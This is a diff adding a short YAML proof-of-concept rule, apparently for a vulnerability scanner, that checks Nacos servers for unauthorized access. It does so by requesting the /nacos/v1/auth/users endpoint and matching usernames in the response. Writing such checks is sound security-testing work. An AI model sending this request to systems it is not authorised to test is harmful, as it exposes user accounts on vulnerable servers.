@@ -1,0 +1,11 @@
+name: poc-yaml-nacos-unauthorized-access
+rules:
+  - method: GET
+    path: "/nacos/v1/auth/users?pageNo=1&pageSize=9"
+    expression: |
+      response.status == 200 && response.body.bcontains(b"username")
+
+detail:
+  author: wenyu
+  links: 
+    - https://github.com/alibaba/nacos/issues/4593
